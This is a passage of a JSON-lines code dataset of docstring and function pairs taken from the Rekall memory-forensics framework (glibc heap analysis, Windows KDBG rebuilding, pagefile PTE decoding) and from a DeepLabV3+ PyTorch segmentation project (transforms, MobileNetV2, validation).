top\n            # field points to the top chunk at beginning of the\n            # main heap\n            if main_arena and hit['hit'] == \\\n                    main_arena.v() + top_offset:\n                continue\n\n            else:\n                temp = self.profile.malloc_par(\n                    hit['hit']-sbrk_base_offset, vm=self.process_as)\n                if not self._check_malloc_par(temp):\n                    continue\n\n            mp_candidates.append(hit)\n\n        # if the first round didn't get rid of all FP, we recheck by\n        # including a check for the mmap_threshold value, which however\n        # can lead to wrong results\n        if len(mp_candidates) > 1:\n            temp_candidates = []\n            for hit in mp_candidates:\n                temp = self.profile.malloc_par(\n                    hit['hit']-sbrk_base_offset, vm=self.process_as)\n                if self._check_malloc_par(temp, check_threshold=True):\n                    temp_candidates.append(hit)\n\n            mp_candidates = temp_candidates\n\n    elif hits and len(hits) == 1:\n        mp_candidates.append(hits[0])\n\n    # if there is still more than one candidate for the malloc_par\n    # struct, we don't have any tests at the moment to differentiate\n    # random data from a real malloc_par\n    if len(mp_candidates) == 1:\n        absolute_offset = mp_candidates[0]['hit'] - sbrk_base_offset\n\n    else:\n        self.session.logging.info(\n            \"We searched for the malloc_par struct but found {:d} \"\n            \"possible candidates. Unfortunately, we currently have \"\n            \"no way to handle this situation appropriately.\"\n            .format(len(mp_candidates)))\n\nif absolute_offset:\n    self.mp_ = self.profile.malloc_par(offset=absolute_offset,\n                                       vm=self.process_as)\n\n    if not self._check_and_report_mp_for_being_swapped(self.mp_):\n        self.session.logging.info(\"Seems like we found a valid \"\n                                  \"malloc_par struct.\")\n\n    else:\n        self.session.logging.info(\n            \"We found a possible malloc_par struct instance but some \"\n            \"fields don't seem valid.\")\n\nelse:\n    if self._is_probably_static_bin:\n        self.session.logging.warn(\n            \"Didn't find the libc filename in the vm_areas of \"\n            \"the current process: {:d} - {:s} . The reason \"\n            \"might be a statically linked binary or an \"\n            \"unexpected error. As we didn't find the malloc_par \"\n            \"struct, we are not able to fix this \"\n            \"issue for statically linked binaries. This will most \"\n            \"probably lead to unreliable results.\"\n            .format(self.task.pid, repr(self.task.comm.v())))\n\n    self.session.logging.warn(\n        \"It seems like the debug information for the mp_ offset are \"\n        \"missing. This means some checks/verifications can't be done.\")", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Returns True if this chunk has its PREV_INUSE bit set.\"\"\"\n\n", "func_signal": "def prev_inuse(self):\n", "code": "if not self._prev_inuse:\n    self._prev_inuse = (self.get_size() & _PREV_INUSE) == _PREV_INUSE\n\nreturn self._prev_inuse", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Used as the wrapper to dump a given chunk to file.\"\"\"\n\n", "func_signal": "def dump_chunk_to_file(self, chunk, chunksize, identifier):\n", "code": "try:\n    data = chunk.get_chunk_data()\n    if isinstance(data, obj.NoneObject):\n        self.session.logging.warn(\n            \"Unable to read from chunk at offset: 0x{:x}.\"\n            .format(chunk.v()))\n        return\n\n    start, _ = chunk.start_and_length()\n\n    filename = self._filename_format_string.format(\n        self.task.pid, identifier, chunk.v(), self._pointer_size * 2,\n        chunksize, len(data),\n        start - chunk.v() - self._chunk_fd_member_offset)\n\n    with self.session.GetRenderer().open(\n            directory=self.dump_dir,\n            filename=filename, mode='wb') as output_file:\n        output_file.write(data)\n\nexcept:\n    print(traceback.format_exc())\n\nfinally:\n    try:\n        output_file.close()\n\n    except:\n        pass", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Modify the destination image to rebuild the KDBG.\"\"\"\n", "func_signal": "def RebuildKDBG(self, out_fd):\n", "code": "if self.profile.metadata(\"arch\") == \"I386\":\n    crash_as_cls = crash.WindowsCrashDumpSpace32\nelse:\n    crash_as_cls = crash.WindowsCrashDumpSpace64\n\n# Open the crash file for writing.\ncrash_as = crash_as_cls(base=out_fd, session=self.session)\n\nkdbg_virtual_address = self.session.GetParameter(\"kdbg\")\nkdbg_physical_address = self.kernel_address_space.vtop(\n    kdbg_virtual_address)\n\n# Construct a _KDDEBUGGER_DATA64 over the old one.\nkdbg = self.profile._KDDEBUGGER_DATA64(\n    offset=kdbg_physical_address,\n    vm=crash_as)\n\n# Clear the old data just in case.\ncrash_as.write(kdbg_physical_address, b\"\\x00\" * kdbg.obj_size)\n\n# The KDBG header.\nkdbg.Header.OwnerTag = b\"KDBG\"\nkdbg.Header.Size = kdbg.obj_size\nkdbg.Header.List.Flink = kdbg.Header.List.Blink = (\n    self._pointer_to_int(kdbg_virtual_address))\n\nkdbg.MmPageSize = 0x1000\n\n# _KTHREAD offsets.\nkthread = self.profile._KTHREAD()\nethread = self.profile._ETHREAD()\nkdbg.SizeEThread = ethread.obj_size\nkdbg.OffsetKThreadNextProcessor = kthread.NextProcessor.obj_offset\n\nkdbg.OffsetKThreadTeb = kthread.Teb.obj_offset\nkdbg.OffsetKThreadKernelStack = kthread.KernelStack.obj_offset\nkdbg.OffsetKThreadInitialStack = kthread.InitialStack.obj_offset\n\nkdbg.OffsetKThreadState = kthread.State.obj_offset\nkdbg.OffsetKThreadApcProcess = kthread.ApcState.Process.obj_offset\n\n# _EPROCESS offsets.\neprocess = self.profile._EPROCESS()\nkdbg.SizeEProcess = eprocess.obj_size\nkdbg.OffsetEprocessPeb = eprocess.m(\"Peb\").obj_offset\nkdbg.OffsetEprocessParentCID = (\n    eprocess.InheritedFromUniqueProcessId.obj_offset)\nkdbg.OffsetEprocessDirectoryTableBase = (\n    eprocess.Pcb.DirectoryTableBase.obj_offset)\n\n# _KPRCB offsets.\nprcb = self.profile._KPRCB()\nkdbg.SizePrcb = prcb.obj_size\nkdbg.OffsetPrcbDpcRoutine = prcb.DpcRoutineActive.obj_offset\nkdbg.OffsetPrcbCurrentThread = prcb.CurrentThread.obj_offset\nkdbg.OffsetPrcbMhz = prcb.MHz.obj_offset\nkdbg.OffsetPrcbCpuType = prcb.CpuType.obj_offset\nkdbg.OffsetPrcbVendorString = prcb.VendorString.obj_offset\nkdbg.OffsetPrcbProcStateSpecialReg = (\n    prcb.ProcessorState.SpecialRegisters.obj_offset)\n\nkdbg.OffsetPrcbProcStateContext = (\n    prcb.ProcessorState.ContextFrame.obj_offset)\n\nkdbg.OffsetPrcbNumber = prcb.Number.obj_offset\n\n# _KPCR offsets.\npcr = self.profile._KPCR()\nkdbg.SizePcr = pcr.obj_size\n\nif self.profile.metadata(\"arch\") == \"AMD64\":\n    kdbg.OffsetPrcbContext = prcb.Context.obj_offset\n    kdbg.OffsetPcrSelfPcr = pcr.Self.obj_offset\n    kdbg.OffsetPcrCurrentPrcb = pcr.CurrentPrcb.obj_offset\n    kdbg.OffsetPcrContainedPrcb = pcr.Prcb.obj_offset\n\n    # Clear the KdpDataBlockEncoded flag from the image.\n    flag = self.profile.get_constant_object(\n        \"KdpDataBlockEncoded\", \"byte\")\n\n    crash_as.write(\n        self.kernel_address_space.vtop(flag.obj_offset), b\"\\x01\")\n\n# Global constants.\nself._SetKDBG(kdbg, \"CmNtCSDVersion\")\nself._SetKDBG(kdbg, \"ExpNumberOfPagedPools\")\nself._SetKDBG(kdbg, \"ExpPagedPoolDescriptor\")\nself._SetKDBG(kdbg, \"ExpPagedPoolDescriptor\")\nself._SetKDBG(kdbg, \"ExpSystemResourcesList\")\nself._SetKDBG(kdbg, \"KdPrintBufferSize\")\nself._SetKDBG(kdbg, \"KdPrintCircularBuffer\")\nself._SetKDBG(kdbg, \"KdPrintCircularBufferEnd\", \"nt!KdpBreakpointTable\")\nself._SetKDBG(kdbg, \"KdPrintRolloverCount\")\nself._SetKDBG(kdbg, \"KdPrintWritePointer\")\nself._SetKDBG(kdbg, \"KeLoaderBlock\", \"nt!KdpLoaderDebuggerBlock\")\nself._SetKDBG(kdbg, \"KeTimeIncrement\")\nself._SetKDBG(kdbg, \"KernBase\", \"nt\")\nself._SetKDBG(kdbg, \"KiBugCheckData\")\nself._SetKDBG(kdbg, \"KiCallUserMode\")\nself._SetKDBG(kdbg, \"KiProcessorBlock\")\nself._SetKDBG(kdbg, \"KiProcessorBlock\")\nself._SetKDBG(kdbg, \"MmAvailablePages\")\nself._SetKDBG(kdbg, \"MmFreePageListHead\")\nself._SetKDBG(kdbg, \"MmHighestPhysicalPage\")\nself._SetKDBG(kdbg, \"MmHighestUserAddress\")\nself._SetKDBG(kdbg, \"MmLastUnloadedDriver\")\nself._SetKDBG(kdbg, \"MmLoadedUserImageList\")\nself._SetKDBG(kdbg, \"MmLowestPhysicalPage\")\nself._SetKDBG(kdbg, \"MmMaximumNonPagedPoolInBytes\")\nself._SetKDBG(kdbg, \"MmModifiedNoWritePageListHead\")\nself._SetKDBG(kdbg, \"MmModifiedPageListHead\")\nself._SetKDBG(kdbg, \"MmNonPagedPoolStart\")\nself._SetKDBG(kdbg, \"MmNumberOfPagingFiles\")\nself._SetKDBG(kdbg, \"MmNumberOfPhysicalPages\")\nself._SetKDBG(kdbg, \"MmPagedPoolEnd\")\nself._SetKDBG(kdbg, \"MmPagedPoolInformation\", \"nt!MmPagedPoolInfo\")\nself._SetKDBG(kdbg, \"MmPfnDatabase\")\nself._SetKDBG(kdbg, \"MmPhysicalMemoryBlock\")\nself._SetKDBG(kdbg, \"MmResidentAvailablePages\")\nself._SetKDBG(kdbg, \"MmSizeOfPagedPoolInBytes\")\nself._SetKDBG(kdbg, \"MmStandbyPageListHead\")\nself._SetKDBG(kdbg, \"MmSubsectionBase\")\nself._SetKDBG(kdbg, \"MmSystemCacheWs\")\nself._SetKDBG(kdbg, \"MmSystemRangeStart\")\nself._SetKDBG(kdbg, \"MmUnloadedDrivers\")\nself._SetKDBG(kdbg, \"MmUserProbeAddress\")\nself._SetKDBG(kdbg, \"MmZeroedPageListHead\")\nself._SetKDBG(kdbg, \"NonPagedPoolDescriptor\")\nself._SetKDBG(kdbg, \"NtBuildLab\")\nself._SetKDBG(kdbg, \"ObpRootDirectoryObject\")\nself._SetKDBG(kdbg, \"ObpTypeObjectType\")\nself._SetKDBG(kdbg, \"PoolTrackTable\")\nself._SetKDBG(kdbg, \"PsActiveProcessHead\")\nself._SetKDBG(kdbg, \"PsLoadedModuleList\")\nself._SetKDBG(kdbg, \"PspCidTable\")", "path": "rekall/rekall-core/rekall/plugins/windows/crashinfo.py", "commit_date": "2017-10-21 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Returns the value of the prev_size field.\"\"\"\n\n", "func_signal": "def get_prev_size(self):\n", "code": "if not self._prev_size:\n    self._prev_size = self.prev_size\n\nreturn self._prev_size", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Tries to find hidden MMAPPED chunks behind stack segemts.\"\"\"\n\n# list of new mmapped chunks lists (first and following chunks)\n", "func_signal": "def _carve_register_mmapped_chunks_hidden_behind_stack(self):\n", "code": "new_mmapped_chunks = []\n\nfor vma in self.vmas:\n    vm_data = vma[2]\n    if not re.search('^\\[stack', vm_data['name']):\n        continue\n\n    vm_start = vma[0]\n    current_chunks = []\n    last_ebp = self._ebp_unrolling(vm_data['ebp'], vma)\n    search_start = last_ebp if last_ebp else vm_start\n\n    temp_chunk = self._search_first_hidden_mmapped_chunk(search_start,\n                                                         vma)\n    current_chunks = self._walk_hidden_mmapped_chunks(temp_chunk)\n\n    if current_chunks:\n        new_mmapped_chunks.append(current_chunks)\n        vm_data['stack_first_mmap_chunk'] = current_chunks[0].v()\n\nself._register_hidden_mmapped_chunks(new_mmapped_chunks)", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Calling this method means that we don't have debug information (in\nthe sense of constant offsets for data structures) for the target libc\nimplementation and do not know the location of the main_arena. If the\ncurrent task contains threads however, we are able to get the location\nof the main_arena. If there are no threads, we still are able to locate\nthe main_arena by folowing the fd/bk pointers in freed chunks.\nThe last attempt is done by walking the chunks of the main heap until\nthe top chunk is hit. As the main arena keeps a pointer to this chunk,\nwe simply search all memory regions for pointers.\nThis method returns either the main_arena or None.\"\"\"\n\n", "func_signal": "def _carve_main_arena(self):\n", "code": "if not self._libc_profile_success:\n    self.session.logging.error(\"No libc profile with rudimentary \"\n                               \"struct information available.\")\n\n    return None\n\n# this function has not yet been called, as it normally depends on an\n# initialized main_arena to function fully\n# as we don't have any main arena yet, we try to call it without a\n# main arena, which in most cases should work\nself._initialize_internal_structs_and_values()\n\nlibc_range = get_libc_range(self.vmas)\n\nif self._are_there_any_threads():\n    self.session.logging.info(\n        \"As there are threads, we try to gather the main_arena \"\n        \"via the _heap_info structs.\")\n\nelse:\n    self.session.logging.info(\n        \"We first try to gather the main_arena via died thread \"\n        \"heaps, assuming there are any.\")\n\ngood_arenas = []\n# bad arenas don't loop with their next pointer within the maximum\n# number of arenas for the current number of cores and the architecture\n# see _check_arenas\nbad_arenas = []\n\n# first we try to find a heap_info struct whose ar_ptr points right\n# after itself this is the case for the first vm_area containing the\n# first heap_info and the according malloc_state struct\nfor vm_start, vm_end, vm_data in self.vmas:\n    if vm_data['name'] == self._heap_vma_identifier \\\n            or vm_data['name'] == self._pot_mmapped_vma_identifier:\n\n        heap_info = self.profile._heap_info(offset=vm_start,\n                                            vm=self.process_as)\n\n        # we try to find a heap_info struct which is followed by a\n        # malloc_state. The prev member of the first _heap_info struct\n        # (which is the one followed by the malloc_state struct) is 0x0\n        heap_info_size = self.profile.get_obj_size('_heap_info')\n\n        if vm_start <= heap_info.ar_ptr.v() <= vm_end:\n            heap_info_address = self.get_aligned_address(\n                heap_info_size + vm_start)\n\n            if heap_info.ar_ptr.v() == heap_info_address \\\n                    and heap_info.prev.v() == 0x0:\n\n                arena = heap_info.ar_ptr\n                arena_consistency = self._check_arenas(\n                    arena, deactivate_swap_check=True)\n\n                if arena_consistency is True or arena_consistency \\\n                        is None:\n                    good_arenas.append(arena)\n\n                else:\n                    bad_arenas.append(arena)\n\nreached_bad_arenas = False\n\n# now we try to use the potential arenas to find the main_arena\n# located in the libc\nfor arena_list in good_arenas, bad_arenas:\n    for arena in arena_list:\n        for pot_main_arena in arena.walk_list('next'):\n            if libc_range and libc_range[0] <= pot_main_arena.v() \\\n                    <= libc_range[1] or not libc_range and \\\n                    not self._offset_in_heap_range(pot_main_arena.v()):\n\n                if reached_bad_arenas:\n                    self.session.logging.warn(\n                        \"The arena pointers for the gathered \"\n                        \"main_arena don't seem to loop. The reason \"\n                        \"might be wrong arena pointers and probably \"\n                        \"leads to unreliable results.\")\n\n                else:\n                    self.session.logging.info(\n                        \"We most probably found the main_arena via \"\n                        \"heap_info structs\")\n\n                self._carve_method = 'heap_info'\n                return pot_main_arena\n\n    reached_bad_arenas = True\n\nself.session.logging.info(\n    \"It doesn't seem like the task with pid {0:d} has any threads, \"\n    \"and as we don't have have the main arena offset, we now try to \"\n    \"find freed chunks and with them the location of the main_arena.\"\n    .format(self.task.pid))\n\n# the previous method didn't work so we now try to gather the main\n# arena via freed chunks\nmain_heap_range = get_mem_range_for_regex(\n    self.vmas, re.escape(self._main_heap_identifier))\n\nif not main_heap_range:\n    return None\n\noffset = self.get_aligned_address(main_heap_range[0] +\n                                  self._static_bin_first_chunk_dist)\nfirst_chunk = self.profile.malloc_chunk(offset, vm=self.process_as)\n\noffset_to_top = self.profile.get_obj_offset(\"malloc_state\", \"top\")\n\n# not used right here, but part of the next method of carving the\n# main arena\ntop_chunk = None\n\nfor free_chunk in self.iterate_through_chunks(first_chunk,\n                                              main_heap_range[1],\n                                              only_free=True,\n                                              return_last_chunk=True):\n\n    top_chunk = free_chunk\n\n    # we now try to follow the bk links to get to the main_arena\n    for curr_free_chunk in free_chunk.walk_list('bk'):\n\n        if libc_range and libc_range[0] <= curr_free_chunk.v() \\\n                <= libc_range[1] or not libc_range and \\\n                not self._offset_in_heap_range(curr_free_chunk.v()):\n            # we are now within the main_arena and try\n            # to find the top chunk by going backwards\n\n            offset_to_binmap = self.profile.get_obj_offset(\n                \"malloc_state\", \"binmap\")\n            maximum_offset_to_top = offset_to_binmap - offset_to_top\n\n            curr_off = curr_free_chunk.v()\n            fmt = 'I' if self._pointer_size == 4 else 'Q'\n\n            # as between the bins and top are only pointers, walking in\n            # size_sz steps should be no problem\n            for i in list(range(\n                    0, maximum_offset_to_top, self._pointer_size)):\n                temp = self.process_as.read(curr_off - i,\n                                            self._pointer_size)\n                temp = struct.unpack(fmt, temp)[0]\n\n                if main_heap_range[0] <= temp <= main_heap_range[1]:\n                    pot_top = self.profile.malloc_chunk(\n                        offset=temp, vm=self.process_as)\n\n                    if pot_top.v() + pot_top.chunksize() == \\\n                            main_heap_range[1]:\n                        # we hit top chunk\n\n                        self.session.logging.info(\n                            \"We found the main_arena via a freed \"\n                            \"chunk.\")\n\n                        self._carve_method = 'freed_chunk'\n                        return self.profile.malloc_state(\n                            offset=(curr_off - i) - offset_to_top,\n                            vm=self.process_as)\n\n# Ending up here means all previous methods were not able to find the\n# main arena. The last method we try at this point is to search for\n# pointers to the top chunk. At least the main_arena should have a\n# pointer to the top chunk\n\nself.session.logging.info(\n    \"We couldn't identify any freed chunk leading to the main arena. \"\n    \"So the last approach is to search for the top chunk, and then \"\n    \"for pointers to it within the loaded libc module.\")\n\nif top_chunk and top_chunk.v() + top_chunk.chunksize() == \\\n        main_heap_range[1]:\n    # we most probably found our top chunk and now search for pointers\n    # to it\n    for hit in self.search_vmas_for_needle(pointers=[top_chunk.v()]):\n        pot_main_arena = self.profile.malloc_state(\n            offset=hit['hit'] - offset_to_top, vm=self.process_as)\n\n        if top_chunk == pot_main_arena.top and \\\n                pot_main_arena.system_mem == (top_chunk.v() +\n                top_chunk.chunksize() -\n                (main_heap_range[0] +\n                 self._static_bin_first_chunk_dist)):\n\n            # as the 'thread arena carving' method didn't find an\n            # arena, the 'next' field should point to itself\n            if pot_main_arena.next == pot_main_arena:\n                self.session.logging.info(\n                    \"We found the main_arena via top chunk.\")\n                self._carve_method = 'top_chunk'\n                return pot_main_arena\n\n            else:\n                arena_consistency = self._check_arenas(\n                    pot_main_arena, deactivate_swap_check=True)\n                if arena_consistency is True or arena_consistency \\\n                        is None:\n                    self.session.logging.info(\n                        \"We found the main_arena via top chunk.\")\n                    self._carve_method = 'top_chunk'\n                    return pot_main_arena\n\nreturn None", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Describe the initial analysis of the PTE.\n\nThis essentially explains how we utilize the flow chart presented in [1]\nFigure 2.\n\"\"\"\n", "func_signal": "def describe_pte(self, collection, pte_addr, pte_value, vaddr):\n", "code": "if pte_value & self.transition_valid_mask:\n    physical_address = (pte_value & 0xffffffffff000) | (vaddr & 0xfff)\n    collection.add(WindowsValidPTEDescriptor,\n                   pte_value=pte_value, pte_addr=pte_addr)\n\n    collection.add(intel.PhysicalAddressDescriptor,\n                   address=physical_address)\n\n# PTE Type is not known - we need to look it up in the vad. This case is\n# triggered when the PTE ProtoAddress field is 0xffffffff - it means to\n# consult the vad. An example PTE value is 0xffffffff00000420.\nelif pte_value & self.prototype_mask:\n    if ((self.proto_protoaddress_mask & pte_value) >>\n            self.proto_protoaddress_start in (0xffffffff0000,\n                                              0xffffffff)):\n\n        collection.add(WindowsSoftwarePTEDescriptor,\n                       pte_value=pte_value, pte_addr=pte_addr)\n\n        self._describe_vad_pte(collection, pte_addr, pte_value, vaddr)\n\n    else:\n        collection.add(WindowsProtoTypePTEDescriptor,\n                       pte_value=pte_value, pte_addr=pte_addr)\n\n        # This PTE points at the prototype PTE in\n        # pte.ProtoAddress. NOTE: The prototype PTE address is specified\n        # in the kernel's address space since it is allocated from pool.\n        pte_addr = pte_value >> self.proto_protoaddress_start\n        pte_value = struct.unpack(\"<Q\", self.read(pte_addr, 8))[0]\n\n        self.describe_proto_pte(collection, pte_addr, pte_value, vaddr)\n\n# Case 2 of consult VAD: pte.u.Soft.PageFileHigh == 0.\nelif pte_value & self.soft_pagefilehigh_mask == 0:\n    collection.add(WindowsSoftwarePTEDescriptor,\n                   pte_value=pte_value, pte_addr=pte_addr)\n\n    self._describe_vad_pte(collection, pte_addr, pte_value, vaddr)\n\n# PTE is demand zero.\nelif (pte_value >> 12) == 0:\n    collection.add(DemandZeroDescriptor)\n\n# PTE is paged out into a valid pagefile address.\nelif pte_value & self.soft_pagefilehigh_mask:\n    pte = self.session.profile._MMPTE()\n    pte.u.Long = pte_value\n\n    # This is the address in the pagefle where the PTE resides.\n    soft_pte = pte.u.Soft\n    pagefile_address = soft_pte.PageFileHigh * 0x1000 + (vaddr & 0xFFF)\n    protection = soft_pte.Protection.v()\n    if protection == 0:\n        collection.add(intel.InvalidAddress, \"Invalid Soft PTE\")\n        return\n\n    collection.add(WindowsPTEDescriptor,\n                   pte_type=\"Soft\", pte_value=pte_value,\n                   pte_addr=pte_addr)\n\n    collection.add(WindowsPagefileDescriptor,\n                   address=pagefile_address,\n                   protection=soft_pte.Protection,\n                   pagefile_number=pte.u.Soft.PageFileLow.v())\n\n    physical_address = self._get_pagefile_mapped_address(\n        soft_pte.PageFileLow.v(), pagefile_address)\n\n    # If we have the pagefile we can just read it now.\n    if physical_address is not None:\n        collection.add(\n            intel.PhysicalAddressDescriptor, address=physical_address)\n\nelse:\n    # Fallback\n    collection.add(intel.AddressTranslationDescriptor,\n                   object_name=\"pte\", object_value=pte_value,\n                   object_address=pte_addr)\n\n    collection.add(intel.CommentDescriptor, \"Error! Unknown PTE\\n\")", "path": "rekall/rekall-core/rekall/plugins/windows/pagefile.py", "commit_date": "2020-01-19 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"Returns the data part of the given allocated chunk.\nThe length parameter is intended only for printing shorter\nparts of the current chunk.\nThe offset makes only sense in combination with the length parameter\nand starts from the beginning of the chunk, so an offset of 4 on a\n32 bit architecture starts on the size member.\"\"\"\n\n", "func_signal": "def get_chunk_data(self, length=None, offset=None):\n", "code": "data_offset = None\nsize = None\n\nif not (length and offset):\n    start, leng = self.start_and_length()\n\ndata_offset = self.v() + offset if offset else start\nsize = length if length else leng\n\nif size <= 0:\n    return b\"\"\n\ndata = self.obj_vm.read(data_offset, size)\n\nif not data:\n    return obj.NoneObject()\n\nreturn data", "path": "rekall/rekall-core/rekall/plugins/linux/heap_analysis.py", "commit_date": "2020-06-16 00:00:00", "repo_name": "google/rekall", "stars": 1890, "license": "gpl-2.0", "language": "python", "size": 145284}
{"docstring": "\"\"\"\nConstructs a MobileNetV2 architecture from\n`\"MobileNetV2: Inverted Residuals and Linear Bottlenecks\" <https://arxiv.org/abs/1801.04381>`_.\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n    progress (bool): If True, displays a progress bar of the download to stderr\n\"\"\"\n", "func_signal": "def mobilenet_v2(pretrained=False, progress=True, **kwargs):\n", "code": "model = MobileNetV2(**kwargs)\nif pretrained:\n    state_dict = load_state_dict_from_url(model_urls['mobilenet_v2'],\n                                          progress=progress)\n    model.load_state_dict(state_dict)\nreturn model", "path": "DeepLabV3Plus-Pytorch/network/backbone/mobilenetv2.py", "commit_date": "2019-12-02 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"\nArgs:\n    img (PIL Image): Image to be cropped.\n    lbl (PIL Image): Label to be cropped.\nReturns:\n    PIL Image: Cropped image.\n    PIL Image: Cropped label.\n\"\"\"\n", "func_signal": "def __call__(self, img, lbl):\n", "code": "assert img.size == lbl.size, 'size of img and lbl should be the same. %s, %s'%(img.size, lbl.size)\nif self.padding > 0:\n    img = F.pad(img, self.padding)\n    lbl = F.pad(lbl, self.padding)\n\n# pad the width if needed\nif self.pad_if_needed and img.size[0] < self.size[1]:\n    img = F.pad(img, padding=int((1 + self.size[1] - img.size[0]) / 2))\n    lbl = F.pad(lbl, padding=int((1 + self.size[1] - lbl.size[0]) / 2))\n\n# pad the height if needed\nif self.pad_if_needed and img.size[1] < self.size[0]:\n    img = F.pad(img, padding=int((1 + self.size[0] - img.size[1]) / 2))\n    lbl = F.pad(lbl, padding=int((1 + self.size[0] - lbl.size[1]) / 2))\n\ni, j, h, w = self.get_params(img, self.size)\n\nreturn F.crop(img, i, j, h, w), F.crop(lbl, i, j, h, w)", "path": "DeepLabV3Plus-Pytorch/utils/ext_transforms.py", "commit_date": "2019-12-13 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"\nArgs:\n    img (PIL Image): Image to be flipped.\n\nReturns:\n    PIL Image: Randomly flipped image.\n\"\"\"\n", "func_signal": "def __call__(self, img, lbl):\n", "code": "if random.random() < self.p:\n    return F.hflip(img), F.hflip(lbl)\nreturn img, lbl", "path": "DeepLabV3Plus-Pytorch/utils/ext_transforms.py", "commit_date": "2019-12-13 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"\nArgs:\n    img (PIL Image): Image to be flipped.\n    lbl (PIL Image): Label to be flipped.\nReturns:\n    PIL Image: Randomly flipped image.\n    PIL Image: Randomly flipped label.\n\"\"\"\n", "func_signal": "def __call__(self, img, lbl):\n", "code": "if random.random() < self.p:\n    return F.vflip(img), F.vflip(lbl)\nreturn img, lbl", "path": "DeepLabV3Plus-Pytorch/utils/ext_transforms.py", "commit_date": "2019-12-13 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"\nThis function is taken from the original tf repo.\nIt ensures that all layers have a channel number that is divisible by 8\nIt can be seen here:\nhttps://github.com/tensorflow/models/blob/master/research/slim/nets/mobilenet/mobilenet.py\n:param v:\n:param divisor:\n:param min_value:\n:return:\n\"\"\"\n", "func_signal": "def _make_divisible(v, divisor, min_value=None):\n", "code": "if min_value is None:\n    min_value = divisor\nnew_v = max(min_value, int(v + divisor / 2) // divisor * divisor)\n# Make sure that round down does not go down by more than 10%.\nif new_v < 0.9 * v:\n    new_v += divisor\nreturn new_v", "path": "DeepLabV3Plus-Pytorch/network/backbone/mobilenetv2.py", "commit_date": "2019-12-02 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"Do validation and return specified samples\"\"\"\n", "func_signal": "def validate(opts, model, loader, device, metrics, ret_samples_ids=None):\n", "code": "metrics.reset()\nret_samples = []\nif opts.save_val_results:\n    if not os.path.exists('results'):\n        os.mkdir('results')\n    denorm = utils.Denormalize(mean=[0.485, 0.456, 0.406], \n                               std=[0.229, 0.224, 0.225])\n    img_id = 0\n\nwith torch.no_grad():\n    for i, (images, labels) in tqdm(enumerate(loader)):\n        \n        images = images.to(device, dtype=torch.float32)\n        labels = labels.to(device, dtype=torch.long)\n\n        outputs = model(images)\n        preds = outputs.detach().max(dim=1)[1].cpu().numpy()\n        targets = labels.cpu().numpy()\n\n        metrics.update(targets, preds)\n        if ret_samples_ids is not None and i in ret_samples_ids:  # get vis samples\n            ret_samples.append(\n                (images[0].detach().cpu().numpy(), targets[0], preds[0]))\n\n        if opts.save_val_results:\n            for i in range(len(images)):\n                image = images[i].detach().cpu().numpy()\n                target = targets[i]\n                pred = preds[i]\n\n                image = (denorm(image) * 255).transpose(1, 2, 0).astype(np.uint8)\n                target = loader.dataset.decode_target(target).astype(np.uint8)\n                pred = loader.dataset.decode_target(pred).astype(np.uint8)\n\n                Image.fromarray(image).save('results/%d_image.png' % img_id)\n                Image.fromarray(target).save('results/%d_target.png' % img_id)\n                Image.fromarray(pred).save('results/%d_pred.png' % img_id)\n\n                fig = plt.figure()\n                plt.imshow(image)\n                plt.axis('off')\n                plt.imshow(pred, alpha=0.7)\n                ax = plt.gca()\n                ax.xaxis.set_major_locator(matplotlib.ticker.NullLocator())\n                ax.yaxis.set_major_locator(matplotlib.ticker.NullLocator())\n                plt.savefig('results/%d_overlay.png' % img_id, bbox_inches='tight', pad_inches=0)\n                plt.close()\n                img_id += 1\n\n    score = metrics.get_results()\nreturn score, ret_samples", "path": "DeepLabV3Plus-Pytorch/main.py", "commit_date": "2020-03-29 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
